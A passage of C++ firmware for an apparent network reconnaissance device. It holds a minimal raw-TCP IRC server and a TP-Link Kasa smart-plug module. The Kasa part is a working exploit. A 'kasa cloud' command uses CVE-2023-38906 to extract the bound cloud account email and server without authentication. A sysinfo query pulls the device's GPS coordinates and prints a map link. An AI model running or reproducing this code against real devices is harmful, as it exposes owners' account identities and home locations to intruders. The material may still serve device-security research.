  if (etype != ETHERTYPE_IPV4)
    return;

  const uint8_t* ipH = pkt + ETH_HEADER_LEN;
  if (ipH[9] != IP_PROTO_TCP)
    return;

  // Check destination is us
  if (memcmp(ipH + 16, ourIP, 4) != 0)
    return;

  uint8_t ihl = (ipH[0] & 0x0F) * 4;
  const uint8_t* tcpH = ipH + ihl;
  uint16_t dstPort = pktRead16(tcpH + 2);
  if (dstPort != IRC_PORT)
    return;

  uint16_t srcPort = pktRead16(tcpH);
  const uint8_t* srcIP = ipH + 12;
  uint32_t theirSeq = pktRead32(tcpH + 4);
  uint32_t theirAck = pktRead32(tcpH + 8);
  uint8_t flags = tcpH[13];
  uint8_t tcpHdrLen = ((tcpH[12] >> 4) & 0x0F) * 4;
  uint16_t ipTotalLen = pktRead16(ipH + 2);
  int payloadLen = ipTotalLen - ihl - tcpHdrLen;
  if (payloadLen < 0)
    payloadLen = 0;

  // ── RST: immediately free slot ──
  if (flags & 0x04) {
    int8_t ci = ircFindClient(srcIP, srcPort);
    if (ci >= 0) {
      Serial.printf("[IRC] Client %u RST from %u.%u.%u.%u\n", ci, srcIP[0], srcIP[1], srcIP[2],
                    srcIP[3]);
      // Remove from channels without sending anything
      for (uint8_t ch = 0; ch < IRC_MAX_CHANNELS; ch++) {
        ircChannels[ch].memberMask &= ~(1 << ci);
        if (ircChannels[ch].active && ircChannels[ch].memberMask == 0)
          ircChannels[ch].active = false;
      }
      if (ircClients[ci].regState == IRC_REG_DONE) {
        ircBroadcastAllChannels(ci, ":%s!%s@%u.%u.%u.%u QUIT :Connection reset",
                                ircClients[ci].nick, ircClients[ci].user, srcIP[0], srcIP[1],
                                srcIP[2], srcIP[3]);
      }
      memset(&ircClients[ci], 0, sizeof(IrcClient));
    }
    return;
  }

  // ── SYN (new connection) ──
  if ((flags & 0x02) && !(flags & 0x10)) {
    // Find free slot
    int8_t freeSlot = -1;
    for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
      if (ircClients[i].tcpState == IRC_TCP_FREE) {
        freeSlot = i;
        break;
      }
    }
    if (freeSlot < 0) {
      // No room — send RST
      uint16_t f = buildTcpRst(txBuf, pkt + ETH_SRC_MAC, ourIP, srcIP, IRC_PORT, srcPort, 0);
      sendRawFrame(txBuf, f);
      return;
    }

    IrcClient& c = ircClients[freeSlot];
    memset(&c, 0, sizeof(IrcClient));
    memcpy(c.peerMAC, pkt + ETH_SRC_MAC, 6);
    memcpy(c.peerIP, srcIP, 4);
    c.peerPort = srcPort;
    c.mySeq = micros() ^ (srcPort << 16) ^ freeSlot;
    c.myAck = theirSeq + 1;  // SYN consumes 1 seq
    c.lastActivity = millis();
    c.tcpState = IRC_TCP_SYN_RCVD;

    uint16_t f = buildTcpSynAck(txBuf, c.peerMAC, ourIP, c.peerIP, IRC_PORT, c.peerPort, c.mySeq,
                                c.myAck);
    sendRawFrame(txBuf, f);
    c.mySeq++;  // Our SYN consumes 1 seq

    Serial.printf("[IRC] SYN from %u.%u.%u.%u:%u -> slot %d\n", srcIP[0], srcIP[1], srcIP[2],
                  srcIP[3], srcPort, freeSlot);
    return;
  }

  // ── Everything else requires an existing client ──
  int8_t ci = ircFindClient(srcIP, srcPort);
  if (ci < 0)
    return;
  IrcClient& c = ircClients[ci];

  // ── ACK completing handshake (SYN_RCVD -> ESTABLISHED) ──
  if (c.tcpState == IRC_TCP_SYN_RCVD && (flags & 0x10)) {
    c.tcpState = IRC_TCP_ESTABLISHED;
    c.lastActivity = millis();
    Serial.printf("[IRC] Client %u connected from %u.%u.%u.%u:%u\n", ci, c.peerIP[0], c.peerIP[1],
                  c.peerIP[2], c.peerIP[3], c.peerPort);
    // No data to process yet in the handshake ACK (usually)
    if (payloadLen == 0)
      return;
  }

  if (c.tcpState != IRC_TCP_ESTABLISHED)
    return;

  // ── FIN ──
  if (flags & 0x01) {
    c.myAck = theirSeq + payloadLen + 1;  // FIN consumes 1 seq
    uint16_t f = buildTcpAck(txBuf, c.peerMAC, ourIP, c.peerIP, IRC_PORT, c.peerPort, c.mySeq,
                             c.myAck);
    sendRawFrame(txBuf, f);

    if (c.regState == IRC_REG_DONE) {
      ircBroadcastAllChannels(ci, ":%s!%s@%u.%u.%u.%u QUIT :Connection closed", c.nick, c.user,
                              c.peerIP[0], c.peerIP[1], c.peerIP[2], c.peerIP[3]);
    }
    for (uint8_t ch = 0; ch < IRC_MAX_CHANNELS; ch++) {
      ircChannels[ch].memberMask &= ~(1 << ci);
      if (ircChannels[ch].active && ircChannels[ch].memberMask == 0)
        ircChannels[ch].active = false;
    }

    // Send FIN+ACK back
    f = buildTcpFinAck(txBuf, c.peerMAC, ourIP, c.peerIP, IRC_PORT, c.peerPort, c.mySeq, c.myAck);
    sendRawFrame(txBuf, f);

    Serial.printf("[IRC] Client %u FIN (%s)\n", ci, c.nick[0] ? c.nick : "unregistered");
    memset(&c, 0, sizeof(IrcClient));
    return;
  }

  // ── Data (PSH+ACK or ACK with payload) ──
  if (payloadLen > 0) {
    // Retransmission check: if we already ACKed past this seq, re-ACK but don't reprocess
    if (theirSeq < c.myAck) {
      uint16_t f = buildTcpAck(txBuf, c.peerMAC, ourIP, c.peerIP, IRC_PORT, c.peerPort, c.mySeq,
                               c.myAck);
      sendRawFrame(txBuf, f);
      return;
    }

    // Out-of-order: ignore (client will retransmit)
    if (theirSeq > c.myAck)
      return;

    const uint8_t* payload = tcpH + tcpHdrLen;

    // Append to line buffer
    for (int i = 0; i < payloadLen && c.linePos < IRC_LINE_BUF - 1; i++) {
      c.lineBuf[c.linePos++] = payload[i];
    }

    // ACK the data
    c.myAck = theirSeq + payloadLen;
    uint16_t f = buildTcpAck(txBuf, c.peerMAC, ourIP, c.peerIP, IRC_PORT, c.peerPort, c.mySeq,
                             c.myAck);
    sendRawFrame(txBuf, f);
    c.lastActivity = millis();

    // Process complete lines
    while (true) {
      char* nl = (char*)memchr(c.lineBuf, '\n', c.linePos);
      if (!nl)
        break;
      *nl = '\0';
      ircProcessLine(ci, c.lineBuf);
      // If client was disconnected during processing, bail
      if (c.tcpState == IRC_TCP_FREE)
        return;
      uint16_t consumed = (nl - c.lineBuf) + 1;
      uint16_t remaining = c.linePos - consumed;
      if (remaining > 0)
        memmove(c.lineBuf, nl + 1, remaining);
      c.linePos = remaining;
    }

    // Overflow protection: if buffer full with no newline, discard
    if (c.linePos >= IRC_LINE_BUF - 1)
      c.linePos = 0;
  }
}

// ── Periodic tick: ping timeouts, abandoned handshakes ──
void ircTick() {
  static uint32_t lastTick = 0;
  if (millis() - lastTick < 1000)
    return;
  lastTick = millis();

  for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
    IrcClient& c = ircClients[i];

    if (c.tcpState == IRC_TCP_SYN_RCVD) {
      if (millis() - c.lastActivity > IRC_HANDSHAKE_TMO) {
        memset(&c, 0, sizeof(IrcClient));
      }
      continue;
    }

    if (c.tcpState != IRC_TCP_ESTABLISHED)
      continue;

    // Send PING if idle
    if (!c.pongPending && (millis() - c.lastActivity > IRC_PING_INTERVAL)) {
      ircSendLine(i, "PING :%s", IRC_SERVER_NAME);
      c.pongPending = true;
      c.lastPingSent = millis();
    }

    // Disconnect if PONG timeout
    if (c.pongPending && (millis() - c.lastPingSent > IRC_PONG_TIMEOUT)) {
      ircDisconnect(i, "Ping timeout");
    }
  }
}

// ── Serial command: irc start/stop/status ──
void parseIrcCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "start", 5) == 0) {
    ircStart();
  } else if (strncmp(cmd, "stop", 4) == 0) {
    ircStop();
  } else if (strncmp(cmd, "status", 6) == 0) {
    ircStatus();
  } else {
    Serial.println("[IRC] Usage:");
    Serial.println("  irc start    Start IRC server on port 6667");
    Serial.println("  irc stop     Stop IRC server");
    Serial.println("  irc status   Show connected clients");
  }
}

void ircStart() {
  memset(ircClients, 0, sizeof(ircClients));
  memset(ircChannels, 0, sizeof(ircChannels));
  ircServerActive = true;
  sendGratuitousArp();

  Serial.println("[IRC] Server listening on port 6667");
  Serial.printf("[IRC] Max %d clients, %d channels\n", IRC_MAX_CLIENTS, IRC_MAX_CHANNELS);
  Serial.printf("[IRC] Host: %u.%u.%u.%u\n", ourIP[0], ourIP[1], ourIP[2], ourIP[3]);
}

void ircStop() {
  for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
    if (ircClients[i].tcpState == IRC_TCP_ESTABLISHED) {
      ircDisconnect(i, "Server shutting down");
    } else if (ircClients[i].tcpState != IRC_TCP_FREE) {
      memset(&ircClients[i], 0, sizeof(IrcClient));
    }
  }
  memset(ircChannels, 0, sizeof(ircChannels));
  ircServerActive = false;
  Serial.println("[IRC] Server stopped.");
}

void ircStatus() {
  if (!ircServerActive) {
    Serial.println("[IRC] Server is not running.");
    return;
  }
  Serial.println("[IRC] Server status:");
  Serial.printf("[IRC] Listening on %u.%u.%u.%u:%u\n", ourIP[0], ourIP[1], ourIP[2], ourIP[3],
                IRC_PORT);

  uint8_t count = 0;
  for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++) {
    IrcClient& c = ircClients[i];
    if (c.tcpState == IRC_TCP_FREE)
      continue;
    count++;
    uint32_t idle = (millis() - c.lastActivity) / 1000;
    Serial.printf("[IRC]   [%u] %u.%u.%u.%u:%u  %s  state=%s  idle=%lus", i, c.peerIP[0],
                  c.peerIP[1], c.peerIP[2], c.peerIP[3], c.peerPort, c.nick[0] ? c.nick : "(none)",
                  c.tcpState == IRC_TCP_SYN_RCVD ? "SYN_RCVD" : "ESTABLISHED", idle);
    if (c.channels) {
      Serial.printf("  chans:");
      for (uint8_t ch = 0; ch < IRC_MAX_CHANNELS; ch++) {
        if (c.channels & (1 << ch) && ircChannels[ch].active)
          Serial.printf(" %s", ircChannels[ch].name);
      }
    }
    Serial.println();
  }

  if (count == 0)
    Serial.println("[IRC]   (no clients connected)");

  for (uint8_t ch = 0; ch < IRC_MAX_CHANNELS; ch++) {
    if (!ircChannels[ch].active)
      continue;
    uint8_t members = 0;
    for (uint8_t i = 0; i < IRC_MAX_CLIENTS; i++)
      if (ircChannels[ch].memberMask & (1 << i))
        members++;
    Serial.printf("[IRC]   Channel %s: %u members\n", ircChannels[ch].name, members);
  }
}

// ══════════════════════════════════════════
//  TP-Link Kasa Smart Device Query
//  Protocol: XOR-encrypted JSON over TCP/9999
// ══════════════════════════════════════════

// ── Kasa XOR encrypt: 4-byte big-endian length prefix + XOR chain ──
uint16_t kasaEncrypt(const char* json, uint8_t* out, uint16_t maxOut) {
  uint16_t jsonLen = strlen(json);
  if (jsonLen + 4 > maxOut)
    return 0;

  // 4-byte big-endian length prefix
  out[0] = (jsonLen >> 24) & 0xFF;
  out[1] = (jsonLen >> 16) & 0xFF;
  out[2] = (jsonLen >> 8) & 0xFF;
  out[3] = jsonLen & 0xFF;

  uint8_t key = KASA_XOR_KEY;
  for (uint16_t i = 0; i < jsonLen; i++) {
    uint8_t a = key ^ (uint8_t)json[i];
    key = a;
    out[4 + i] = a;
  }
  return jsonLen + 4;
}

// ── Kasa XOR decrypt: skip 4-byte length prefix, reverse XOR chain ──
uint16_t kasaDecrypt(const uint8_t* data, uint16_t len, char* out, uint16_t maxOut) {
  if (len <= 4)
    return 0;
  uint16_t payloadLen = len - 4;
  if (payloadLen >= maxOut)
    payloadLen = maxOut - 1;

  uint8_t key = KASA_XOR_KEY;
  for (uint16_t i = 0; i < payloadLen; i++) {
    out[i] = (char)(key ^ data[4 + i]);
    key = data[4 + i];
  }
  out[payloadLen] = '\0';
  return payloadLen;
}

// ── Tiny JSON value extractor (no allocator needed) ──
// Finds "key": "value" or "key": number in a JSON string.
// Returns pointer to start of value, sets len. Returns NULL if not found.
static const char* kasaJsonFind(const char* json, const char* key, uint16_t* valLen) {
  const char* p = json;
  uint16_t keyLen = strlen(key);

  while ((p = strstr(p, key)) != NULL) {
    // Check it's a proper key (preceded by ")
    if (p > json && *(p - 1) == '"') {
      const char* afterKey = p + keyLen;
      if (*afterKey == '"') {
        // Skip ":<whitespace>
        afterKey++;
        while (*afterKey == ':' || *afterKey == ' ')
          afterKey++;

        if (*afterKey == '"') {
          // String value
          const char* valStart = afterKey + 1;
          const char* valEnd = strchr(valStart, '"');
          if (valEnd) {
            *valLen = valEnd - valStart;
            return valStart;
          }
        } else if (*afterKey == '-' || (*afterKey >= '0' && *afterKey <= '9')) {
          // Numeric value
          const char* valStart = afterKey;
          const char* valEnd = valStart;
          while (*valEnd == '-' || *valEnd == '.' || (*valEnd >= '0' && *valEnd <= '9'))
            valEnd++;
          *valLen = valEnd - valStart;
          return valStart;
        }
      }
    }
    p++;
  }
  *valLen = 0;
  return NULL;
}

// Helper: extract a JSON string value into a buffer
static bool kasaJsonStr(const char* json, const char* key, char* out, uint16_t maxOut) {
  uint16_t vLen;
  const char* v = kasaJsonFind(json, key, &vLen);
  if (!v || vLen == 0)
    return false;
  if (vLen >= maxOut)
    vLen = maxOut - 1;
  memcpy(out, v, vLen);
  out[vLen] = '\0';
  return true;
}

// Helper: extract a JSON integer value
static bool kasaJsonInt(const char* json, const char* key, int32_t* out) {
  uint16_t vLen;
  const char* v = kasaJsonFind(json, key, &vLen);
  if (!v || vLen == 0)
    return false;
  char tmp[16];
  if (vLen >= sizeof(tmp))
    return false;
  memcpy(tmp, v, vLen);
  tmp[vLen] = '\0';
  *out = atol(tmp);
  return true;
}

// ── Generic Kasa TCP transport ──
// Sends jsonCmd to targetIP:9999, returns decrypted JSON in outJson.
// Returns length of decrypted JSON, or -1 on error.
int16_t kasaSendRecv(const uint8_t* targetIP, const char* jsonCmd, char* outJson, uint16_t maxOut) {
  // Resolve target MAC
  uint8_t dstMAC[6];
  if (!resolveMacForIP(targetIP, dstMAC)) {
    Serial.println("[KASA] Failed to resolve target MAC. Try: recon sweep first.");
    return -1;
  }

  // Encrypt the command
  uint16_t encLen = kasaEncrypt(jsonCmd, kasaBuf, KASA_BUF_SIZE);
  if (encLen == 0) {
    Serial.println("[KASA] Encrypt failed.");
    return -1;
  }

  static uint16_t ephPort = 42000;
  uint16_t srcPort = ephPort++;
  if (ephPort > 59000)
    ephPort = 42000;

  // ── Phase 1: SYN ──
  uint16_t frameLen = buildTcpSyn(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT);
  sendRawFrame(txBuf, frameLen);

  // ── Phase 2: Wait for SYN-ACK ──
  uint32_t deadline = millis() + KASA_TIMEOUT_MS;
  bool gotSynAck = false;
  uint32_t serverSeq = 0;
  uint32_t mySeq = 0;

  while (millis() < deadline) {
    uint16_t rxSize = w5500.getRXReceivedSize(RAW_SOCKET);
    if (rxSize == 0) {
      delay(1);
      continue;
    }

    uint16_t len = recvfrom(RAW_SOCKET, packetBuf, MAX_FRAME_SIZE, NULL, NULL);
    if (len < ETH_HEADER_LEN + 40)
      continue;
    if (pktRead16(packetBuf + ETH_TYPE) != ETHERTYPE_IPV4)
      continue;

    const uint8_t* ipH = packetBuf + ETH_HEADER_LEN;
    if (ipH[9] != IP_PROTO_TCP)
      continue;
    if (memcmp(ipH + 12, targetIP, 4) != 0)
      continue;

    uint8_t ihl = (ipH[0] & 0x0F) * 4;
    const uint8_t* tcpH = ipH + ihl;
    if (pktRead16(tcpH) != KASA_PORT || pktRead16(tcpH + 2) != srcPort)
      continue;

    uint8_t flags = tcpH[13];
    if ((flags & 0x12) == 0x12) {  // SYN+ACK
      serverSeq = pktRead32(tcpH + 4);
      mySeq = pktRead32(tcpH + 8);  // Server's ACK = our real SYN seq + 1
      gotSynAck = true;
      break;
    }
    if (flags & 0x04) {  // RST
      Serial.println("[KASA] Connection refused (RST).");
      return -1;
    }
  }

  if (!gotSynAck) {
    Serial.println("[KASA] No SYN-ACK — device not responding on port 9999.");
    return -1;
  }

  // ── Phase 3: Complete handshake — send ACK ──
  uint32_t myAck = serverSeq + 1;

  frameLen = buildTcpAck(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq, myAck);
  sendRawFrame(txBuf, frameLen);
  delay(5);

  // ── Phase 4: Send encrypted Kasa command via PSH+ACK ──
  frameLen = buildTcpDataPush(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq, myAck,
                              kasaBuf, encLen);
  sendRawFrame(txBuf, frameLen);
  mySeq += encLen;

  // ── Phase 5: Read response (may arrive in multiple segments) ──
  uint16_t respLen = 0;
  deadline = millis() + KASA_TIMEOUT_MS;

  while (millis() < deadline && respLen < KASA_BUF_SIZE - 1) {
    uint16_t rxSize = w5500.getRXReceivedSize(RAW_SOCKET);
    if (rxSize == 0) {
      delay(1);
      continue;
    }

    uint16_t len = recvfrom(RAW_SOCKET, packetBuf, MAX_FRAME_SIZE, NULL, NULL);
    if (len < ETH_HEADER_LEN + 40)
      continue;
    if (pktRead16(packetBuf + ETH_TYPE) != ETHERTYPE_IPV4)
      continue;

    const uint8_t* ipH = packetBuf + ETH_HEADER_LEN;
    if (ipH[9] != IP_PROTO_TCP)
      continue;
    if (memcmp(ipH + 12, targetIP, 4) != 0)
      continue;

    uint8_t ihl = (ipH[0] & 0x0F) * 4;
    const uint8_t* tcpH = ipH + ihl;
    if (pktRead16(tcpH) != KASA_PORT || pktRead16(tcpH + 2) != srcPort)
      continue;

    uint8_t flags = tcpH[13];
    uint8_t tcpHdrLen = ((tcpH[12] >> 4) & 0x0F) * 4;
    uint16_t ipTotalLen = pktRead16(ipH + 2);
    int payloadLen = ipTotalLen - ihl - tcpHdrLen;

    if (payloadLen > 0) {
      const uint8_t* payload = tcpH + tcpHdrLen;
      uint16_t copyLen = payloadLen;
      if (respLen + copyLen > KASA_BUF_SIZE)
        copyLen = KASA_BUF_SIZE - respLen;
      memcpy(kasaBuf + respLen, payload, copyLen);
      respLen += copyLen;

      // ACK the data
      uint32_t theirSeq = pktRead32(tcpH + 4);
      myAck = theirSeq + payloadLen;
      uint16_t ackFrame = buildTcpAck(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq,
                                      myAck);
      sendRawFrame(txBuf, ackFrame);

      // Check if we got the full message (4-byte length prefix tells us)
      if (respLen >= 4) {
        uint32_t expectedLen = ((uint32_t)kasaBuf[0] << 24) | ((uint32_t)kasaBuf[1] << 16) |
                               ((uint32_t)kasaBuf[2] << 8) | kasaBuf[3];
        if (respLen >= expectedLen + 4)
          break;  // Got full response
      }
    }

    if (flags & 0x01)
      break;  // FIN
  }

  // ── Phase 6: RST to tear down ──
  frameLen = buildTcpRst(txBuf, dstMAC, ourIP, targetIP, srcPort, KASA_PORT, mySeq);
  sendRawFrame(txBuf, frameLen);

  if (respLen <= 4) {
    Serial.println("[KASA] No response data received.");
    return -1;
  }

  // ── Decrypt response ──
  uint16_t jsonLen = kasaDecrypt(kasaBuf, respLen, outJson, maxOut);
  if (jsonLen == 0) {
    Serial.println("[KASA] Decrypt failed.");
    return -1;
  }

  return (int16_t)jsonLen;
}

// ── Query sysinfo (device details + GPS) ──
void kasaQuerySysinfo(const uint8_t* targetIP) {
  Serial.printf("[KASA] Querying sysinfo %u.%u.%u.%u ...\n", targetIP[0], targetIP[1], targetIP[2],
                targetIP[3]);
  idsSetLed(COLOR_YELLOW);

  static char jsonResp[KASA_BUF_SIZE];
  int16_t jsonLen = kasaSendRecv(targetIP, "{\"system\":{\"get_sysinfo\":{}}}", jsonResp,
                                 KASA_BUF_SIZE);
  if (jsonLen < 0) {
    idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
    return;
  }

  char val[128];
  int32_t numVal;

  Serial.println();
  Serial.println("  ┌─────────────────────────────────────────────────────────────┐");
  Serial.println("  │                  Kasa Device Information                    │");
  Serial.println("  └─────────────────────────────────────────────────────────────┘");
  Serial.println();

  if (kasaJsonStr(jsonResp, "alias", val, sizeof(val)))
    Serial.printf("  Device:     %s\n", val);

  if (kasaJsonStr(jsonResp, "model", val, sizeof(val)))
    Serial.printf("  Model:      %s\n", val);

  if (kasaJsonStr(jsonResp, "dev_name", val, sizeof(val)))
    Serial.printf("  Dev Name:   %s\n", val);

  if (kasaJsonStr(jsonResp, "mac", val, sizeof(val)))
    Serial.printf("  MAC:        %s\n", val);

  if (kasaJsonStr(jsonResp, "hw_ver", val, sizeof(val)))
    Serial.printf("  Hardware:   %s\n", val);

  if (kasaJsonStr(jsonResp, "sw_ver", val, sizeof(val)))
    Serial.printf("  Firmware:   %s\n", val);

  if (kasaJsonStr(jsonResp, "deviceId", val, sizeof(val)))
    Serial.printf("  Device ID:  %s\n", val);

  if (kasaJsonInt(jsonResp, "relay_state", &numVal))
    Serial.printf("  Relay:      %s\n", numVal ? "ON" : "OFF");

  if (kasaJsonInt(jsonResp, "rssi", &numVal))
    Serial.printf("  RSSI:       %ld dBm\n", numVal);

  // GPS coordinates
  int32_t lat_i = 0, lon_i = 0;
  bool hasLat = kasaJsonInt(jsonResp, "latitude_i", &lat_i);
  bool hasLon = kasaJsonInt(jsonResp, "longitude_i", &lon_i);

  if (!hasLat)
    hasLat = kasaJsonInt(jsonResp, "latitude", &lat_i);
  if (!hasLon)
    hasLon = kasaJsonInt(jsonResp, "longitude", &lon_i);

  if (hasLat && hasLon) {
    int32_t latWhole = lat_i / 10000;
    int32_t latFrac = (lat_i < 0 ? -lat_i : lat_i) % 10000;
    int32_t lonWhole = lon_i / 10000;
    int32_t lonFrac = (lon_i < 0 ? -lon_i : lon_i) % 10000;

    Serial.printf("  Latitude:   %ld.%04ld\n", latWhole, latFrac);
    Serial.printf("  Longitude:  %ld.%04ld\n", lonWhole, lonFrac);
    Serial.printf("  Maps:       https://www.google.com/maps?q=%ld.%04ld,%ld.%04ld\n", latWhole,
                  latFrac, lonWhole, lonFrac);
  }

  Serial.println();
  Serial.printf("[KASA] Sysinfo: %u bytes decrypted.\n", jsonLen);
  idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
}

// ── Extract cloud account credentials (CVE-2023-38906) ──
// cnCloud get_info returns the TP-Link cloud account email, server, and bind state
// without any authentication over the local XOR protocol.
void kasaQueryCloud(const uint8_t* targetIP) {
  Serial.printf("[KASA] Extracting cloud credentials from %u.%u.%u.%u ...\n", targetIP[0],
                targetIP[1], targetIP[2], targetIP[3]);
  idsSetLed(COLOR_YELLOW);

  static char jsonResp[KASA_BUF_SIZE];

  // First get device context via sysinfo (single query, always works)
  int16_t sysLen = kasaSendRecv(targetIP, "{\"system\":{\"get_sysinfo\":{}}}", jsonResp,
                                KASA_BUF_SIZE);

  char alias[64] = "(unknown)";
  char model[32] = "";
  char devMac[24] = "";
  char fwVer[64] = "";
  char devId[64] = "";

  if (sysLen > 0) {
    kasaJsonStr(jsonResp, "alias", alias, sizeof(alias));
    kasaJsonStr(jsonResp, "model", model, sizeof(model));
    kasaJsonStr(jsonResp, "mac", devMac, sizeof(devMac));
    kasaJsonStr(jsonResp, "sw_ver", fwVer, sizeof(fwVer));
    kasaJsonStr(jsonResp, "deviceId", devId, sizeof(devId));
  }

  delay(100);  // Brief pause between TCP connections

  // Now query cloud info
  int16_t jsonLen = kasaSendRecv(targetIP, "{\"cnCloud\":{\"get_info\":{}}}", jsonResp,
                                 KASA_BUF_SIZE);
  if (jsonLen < 0) {
    idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
    return;
  }

  Serial.println();
  Serial.println("  ┌─────────────────────────────────────────────────────────────┐");
  Serial.println("  │              Kasa Cloud Account Credentials                 │");
  Serial.println("  │           CVE-2023-38906 — No Auth Required                │");
  Serial.println("  └─────────────────────────────────────────────────────────────┘");
  Serial.println();

  // Show device context first
  Serial.printf("  Device:     %s (%s)\n", alias, model);
  if (devMac[0])
    Serial.printf("  MAC:        %s\n", devMac);
  if (fwVer[0])
    Serial.printf("  Firmware:   %s\n", fwVer);
  if (devId[0])
    Serial.printf("  Device ID:  %s\n", devId);
  Serial.println();

  // Dump raw cloud JSON for full visibility
  Serial.println("  ── Raw Cloud Response ──");
  // Print in chunks to avoid serial buffer overflow
  const char* rp = jsonResp;
  uint16_t remaining = (uint16_t)jsonLen;
  while (remaining > 0) {
    uint16_t chunk = remaining > 120 ? 120 : remaining;
    Serial.printf("  %.*s\n", chunk, rp);
    rp += chunk;
    remaining -= chunk;
    delay(5);  // Let serial buffer drain
  }
  Serial.println();

  // Parse and display known fields
  char val[128];
  int32_t numVal;

  Serial.println("  ── Parsed Fields ──");

  // Username — the key credential. Handle empty string case.
  uint16_t vLen;
  const char* v = kasaJsonFind(jsonResp, "username", &vLen);
  if (v) {
    if (vLen > 0) {
      uint16_t copyLen = vLen < sizeof(val) - 1 ? vLen : sizeof(val) - 1;
      memcpy(val, v, copyLen);
      val[copyLen] = '\0';
      Serial.printf("  Account:    %s\n", val);
    } else {
      Serial.println("  Account:    (empty — no cloud account bound)");
    }
  }

  if (kasaJsonStr(jsonResp, "server", val, sizeof(val)))
    Serial.printf("  Cloud SVR:  %s\n", val);

  if (kasaJsonInt(jsonResp, "binded", &numVal))
    Serial.printf("  Bound:      %s\n", numVal ? "YES" : "NO");

  if (kasaJsonInt(jsonResp, "cld_connection", &numVal))
    Serial.printf("  Connected:  %s\n", numVal ? "YES" : "NO");

  if (kasaJsonInt(jsonResp, "illegalType", &numVal))
    Serial.printf("  Illegal:    %ld\n", numVal);

  if (kasaJsonInt(jsonResp, "tcspStatus", &numVal))
    Serial.printf("  TCSP:       %ld\n", numVal);

  if (kasaJsonInt(jsonResp, "fwNotifyType", &numVal))
    Serial.printf("  FW Notify:  %ld\n", numVal);

  if (kasaJsonInt(jsonResp, "err_code", &numVal))
    Serial.printf("  Err Code:   %ld\n", numVal);

  Serial.println();
  Serial.printf("[KASA] Cloud info: %u bytes decrypted.\n", jsonLen);
  idsSetLed(capturing ? COLOR_GREEN : COLOR_BLUE);
}

// ── Kasa command parser ──
void parseKasaCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (*cmd == '\0') {
    Serial.println("[KASA] Usage:");
    Serial.println("  kasa <IP>          Query device sysinfo + GPS");
    Serial.println("  kasa cloud <IP>    Extract cloud account credentials");
    return;
  }

  // Check for "cloud" subcommand
  if (strncmp(cmd, "cloud ", 6) == 0) {
    const char* ipStr = cmd + 6;
    while (*ipStr == ' ')
      ipStr++;
    uint8_t targetIP[4];
    if (!parseIP(ipStr, targetIP)) {
      Serial.println("[KASA] Invalid IP. Usage: kasa cloud 192.168.50.109");
      return;
    }
    kasaQueryCloud(targetIP);
    return;
  }

  uint8_t targetIP[4];
  if (!parseIP(cmd, targetIP)) {
    Serial.println("[KASA] Invalid IP. Usage: kasa 192.168.50.109");
    return;
  }

  kasaQuerySysinfo(targetIP);
}
